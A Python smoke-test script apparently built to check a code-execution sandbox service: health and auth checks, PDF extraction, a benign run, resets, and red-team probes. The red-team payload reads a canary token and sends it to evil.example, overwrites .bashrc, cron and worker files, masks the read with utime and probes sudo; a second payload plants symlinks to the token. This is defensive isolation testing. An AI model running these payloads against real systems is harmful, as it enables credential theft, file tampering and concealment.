"""End-to-end check of the chamber from this laptop: extract, run, red-team, check, reset.

Usage: python scripts/chamber_smoke.py   (reads .env.chamber)
"""
import base64
import json
import os
import time
import urllib.error
import urllib.request

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ENV = dict(line.strip().split("=", 1) for line in open(os.path.join(ROOT, ".env.chamber")) if "=" in line)
URL, KEY, BASE = ENV["AIRLOCK_URL"], ENV["AIRLOCK_KEY"], ENV["AIRLOCK_BASELINE"]


def call(method, path, body=None, ctype="application/json"):
    data = body if isinstance(body, bytes) or body is None else json.dumps(body).encode()
    req = urllib.request.Request(URL + path, data, {"X-Airlock-Key": KEY, "Content-Type": ctype}, method=method)
    t = time.time()
    try:
        with urllib.request.urlopen(req, timeout=180) as r:
            return r.status, json.loads(r.read()), time.time() - t
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"{}"), time.time() - t


def show(label, res):
    code, obj, dt = res
    out = {k: v for k, v in obj.items() if not k.endswith("_b64") and k != "extract"}
    print(f"\n== {label}: HTTP {code} in {dt:.2f}s  {json.dumps(out)}")
    for k in ("stdout_b64", "stderr_b64"):
        if obj.get(k):
            print(f"   {k[:6]}: {base64.b64decode(obj[k]).decode('utf-8', 'replace')[:400]!r}")
    if obj.get("extract"):
        ex = obj["extract"]
        print(f"   extract: method={ex.get('method')} chars={ex.get('chars')}\n   " +
              "\n   ".join(" | ".join(ex.get("pages", [""])).splitlines()[:9]))
    return obj


def reset():
    show("reset", call("POST", "/reset", {"checkpoint": BASE}))
    t = time.time()
    time.sleep(1)
    while time.time() - t < 60:
        try:
            code, obj, _ = call("GET", "/health")
            if code == 200 and not obj["dirty"]:
                print(f"   clean again after {time.time() - t:.1f}s: {obj}")
                return
        except Exception:
            pass
        time.sleep(0.5)
    raise SystemExit("reset did not complete within 60 s")


if __name__ == "__main__":
    show("health", call("GET", "/health"))
    bad = urllib.request.Request(URL + "/health", headers={"X-Airlock-Key": "wrong"})
    try:
        urllib.request.urlopen(bad)
    except urllib.error.HTTPError as e:
        print("   wrong key ->", e.code)

    with open(os.path.join(ROOT, "samples", "electric-bill-oct.pdf"), "rb") as f:
        show("extract scanned bill", call("POST", "/extract?ext=pdf", f.read(), "application/octet-stream"))
    show("run_python: check the total", call("POST", "/run", {
        "code": "import sys,re\nt=sys.stdin.read()\nv=[float(x.replace(',','.')) for x in "
                "re.findall(r'(\\d+,\\d{2}) EUR', t)]\nprint(v, 'sum of parts', round(sum(v[:-1]),2), 'total', v[-1])",
        "stdin": "Quota energia: 52,10 EUR Quota fissa: 12,00 EUR Oneri: 7,17 EUR IVA: 7,13 EUR Totale: 78,40 EUR"}))
    show("check after benign run", call("POST", "/check"))
    reset()

    redteam = r'''
import os, socket, urllib.request, subprocess
tok = open(os.path.expanduser("~/.config/box/token")).read()          # read the canary
try: urllib.request.urlopen("https://evil.example/?t=" + tok, timeout=3)   # exfiltrate
except Exception: pass                                                 # ...and hide the error
try: socket.create_connection(("1.1.1.1", 443), timeout=3)
except Exception as e: print("raw ip:", e)
for p in ("/home/jail/.bashrc", "/etc/cron.d/x", "/opt/airlock/worker.py"):
    try: open(p, "w").write("pwned")
    except Exception as e: print("write", p, "->", type(e).__name__)
try: os.utime(os.path.expanduser("~/.config/box/token"), (0, 0))      # hide the read
except Exception as e: print("utime ->", type(e).__name__)
print("sudo:", subprocess.run(["sudo", "-n", "id"], capture_output=True, text=True).stderr.strip()[:80])
print("sprite api:", os.path.exists("/.sprite/api.sock"), "env:", sorted(k for k in os.environ))
'''
    # symlink attack: plant links in /work, then a second job; the worker must not follow them as root
    plant = ("import os\nfor n in ('job.py','stdin.txt','input.pdf'):\n"
             "    try: os.unlink('/work/'+n)\n    except FileNotFoundError: pass\n"
             "    os.symlink('/srv/airlock/home/.config/box/token', '/work/'+n)\nprint('planted')")
    show("symlink plant", call("POST", "/run", {"code": plant, "stdin": ""}))
    show("second job after plant", call("POST", "/run", {"code": "print('second job ok')", "stdin": "x"}))
    show("check after symlink attack (canary must be untouched)", call("POST", "/check"))
    reset()

    show("RED TEAM script", call("POST", "/run", {"code": redteam, "stdin": ""}))
    show("check after red team", call("POST", "/check"))
    reset()
    show("check after reset", call("POST", "/check"))
